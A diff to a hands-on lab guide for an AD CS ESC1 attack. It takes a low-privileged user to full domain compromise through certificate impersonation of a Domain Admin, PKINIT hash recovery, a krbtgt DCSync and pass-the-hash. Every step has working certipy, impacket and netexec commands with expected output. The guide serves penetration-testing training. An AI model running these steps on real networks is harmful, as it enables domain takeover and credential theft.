@@ -2,9 +2,9 @@
 
 **Lab Description:** In this lab you will escalate from a single low-privileged domain user to
 **full domain compromise** by abusing a misconfigured Active Directory Certificate Services
-(AD CS) template (**ESC1**). You will discover the vulnerable template, request a certificate
-that impersonates the built-in **Administrator**, authenticate with it to recover the
-Administrator's NTLM hash, and use that hash to **DCSync** the domain's secrets.
+(AD CS) template (**ESC1**). You will request a certificate that impersonates a **Domain
+Admin**, authenticate with it to recover that account's NTLM hash, and use the hash to
+**DCSync** the domain's secrets.
 
 **Estimated Duration:** **15 Minutes**
 
@@ -23,74 +23,73 @@ Administrator's NTLM hash, and use that hash to **DCSync** the domain's secrets.
 | Enterprise CA | `corp-CA` on `adcs.corp.local` (10.0.1.40) |
 | Attacker host | `kali` |
 | Starting credential (low-priv user) | `amiller` / `Summer2024` |
+| Target to impersonate | `adm.itadmin` (a Domain Admin) |
+
+> **Why `adm.itadmin` and not the built-in `Administrator`?** The built-in `Administrator`
+> account has no `userPrincipalName`, so a UPN-based certificate can't map to it (you'd get
+> `KDC_ERR_C_PRINCIPAL_UNKNOWN`). `adm.itadmin` is a named Domain Admin that *has* a UPN, so
+> the certificate maps cleanly — and it's equally privileged.
 
 ---
 
-1. From the **Kali** host, enumerate AD CS for vulnerable certificate templates using
-   **certipy-ad**.
+1. *(Optional)* From **Kali**, enumerate AD CS for vulnerable templates with **certipy-ad**.
 
     ```bash
     certipy-ad find -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 -vulnerable -stdout
     ```
 
-    **Expected Output:** the `ESC1-VulnUser` template is reported as **ESC1** vulnerable — any
-    domain user can enrol and supply an arbitrary subject (UPN).
+    This should report `ESC1-VulnUser` as **ESC1** vulnerable.
 
-    ```output
-    Certificate Templates
-      0
-        Template Name      : ESC1-VulnUser
-        Enrollment Rights  : CORP.LOCAL\Domain Users
-        [!] Vulnerabilities
-          ESC1  : Enrollee supplies subject and template allows client authentication.
-    ```
+    > **Note:** if `find` errors with an SSL/`Connection reset` message, that's certipy probing
+    > the CA's HTTPS enrollment endpoint (this lab uses HTTP). It's harmless — the exploit in
+    > the next steps does not depend on it, and we already know the vulnerable template.
 
-    > **Note (time skew):** certificate/Kerberos operations are time-sensitive. If a command
-    > returns `KRB_AP_ERR_SKEW`, run `sudo systemctl restart systemd-timesyncd && sleep 5`
-    > (or add `-ns 10.0.1.10` to the certipy command) and retry.
-
-1. Abuse ESC1: request a certificate from the vulnerable template but set the subject UPN to
-   **administrator@corp.local** — i.e. ask the CA for a cert that identifies you as the
-   Domain Administrator.
+1. Abuse ESC1: request a certificate from the vulnerable template, setting the subject UPN to
+   **adm.itadmin@corp.local** — i.e. ask the CA for a cert that identifies you as that Domain
+   Admin.
 
     ```bash
     certipy-ad req -u amiller@corp.local -p 'Summer2024' -dc-ip 10.0.1.10 \
       -target adcs.corp.local -ca 'corp-CA' -template 'ESC1-VulnUser' \
-      -upn 'administrator@corp.local'
+      -upn 'adm.itadmin@corp.local'
     ```
 
-    **Expected Output:** the CA issues the certificate and it is saved locally.
+    **Expected Output:** the CA issues the certificate and saves it locally.
 
     ```output
     [*] Requesting certificate via RPC
     [*] Successfully requested certificate
-    [*] Saving certificate and private key to 'administrator.pfx'
+    [*] Got certificate with UPN 'adm.itadmin@corp.local'
+    [*] Saving certificate and private key to 'adm.itadmin.pfx'
     ```
 
 1. Authenticate to the DC with the issued certificate (PKINIT). certipy exchanges it for a
    Kerberos TGT and recovers the account's **NTLM hash**.
 
     ```bash
-    certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.1.10
+    certipy-ad auth -pfx adm.itadmin.pfx -dc-ip 10.0.1.10
     ```
 
     **Expected Output:**
 
     ```output
-    [*] Using principal: administrator@corp.local
+    [*] Using principal: 'adm.itadmin@corp.local'
     [*] Trying to get TGT...
     [*] Got TGT
-    [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
+    [*] Got hash for 'adm.itadmin@corp.local': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
     ```
 
-    Copy the `<NTLM_HASH>` (the part after the colon) — that's the Domain Administrator's hash.
+    Copy the `<NTLM_HASH>` (the part after the colon) — that's the Domain Admin's hash.
 
-1. Use the Administrator hash to **DCSync** the domain — replicate secrets straight from the
-   DC. Here we pull the `krbtgt` account (the key to forging Golden Tickets), proving full
-   domain compromise.
+    > **Note (time skew):** if `auth` returns `KRB_AP_ERR_SKEW`, sync the clock and retry:
+    > `sudo systemctl restart systemd-timesyncd && sleep 5`
+
+1. Use the recovered hash to **DCSync** the domain — replicate secrets straight from the DC.
+   Here we pull the `krbtgt` account (the key to forging Golden Tickets), proving full domain
+   compromise. Replace `<NTLM_HASH>` with the hash from the previous step.
 
     ```bash
-    impacket-secretsdump 'corp.local/administrator@10.0.1.10' -hashes ':<NTLM_HASH>' -just-dc-user krbtgt
+    impacket-secretsdump 'corp.local/adm.itadmin@10.0.1.10' -hashes ':<NTLM_HASH>' -just-dc-user krbtgt
     ```
 
     **Expected Output:**
@@ -101,25 +100,23 @@ Administrator's NTLM hash, and use that hash to **DCSync** the domain's secrets.
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<krbtgt_hash>:::
     ```
 
-1. (Optional) Confirm Domain Admin access interactively with the recovered hash
-   (pass-the-hash):
+1. *(Optional)* Confirm Domain Admin access with the recovered hash (pass-the-hash):
 
     ```bash
-    netexec smb 10.0.1.10 -u administrator -H <NTLM_HASH>
+    netexec smb 10.0.1.10 -u adm.itadmin -H <NTLM_HASH>
     ```
 
     **Expected Output:** the `(Pwn3d!)` flag indicates administrative access to the DC.
 
     ```output
-    SMB   10.0.1.10   445   DC1   [+] corp.local\administrator:<hash> (Pwn3d!)
+    SMB   10.0.1.10   445   dc1   [+] corp.local\adm.itadmin:<hash> (Pwn3d!)
     ```
 
 **Lab 2 Recap:** In this lab, you:
 
-- Discovered the `ESC1-VulnUser` template as **ESC1** vulnerable with `certipy find`.
-- Requested a certificate impersonating **Administrator** by abusing the enrollee-supplies-
-  subject misconfiguration.
-- Authenticated with the certificate to recover the Administrator NTLM hash.
+- Abused the `ESC1-VulnUser` template's enrollee-supplies-subject misconfiguration to request
+  a certificate impersonating the Domain Admin `adm.itadmin`.
+- Authenticated with the certificate (PKINIT) to recover its NTLM hash.
 - **DCSync'd** the domain and dumped the `krbtgt` hash — full domain compromise.
 
 This proves the AD CS **ESC1** attack path is exploitable end-to-end and the environment can
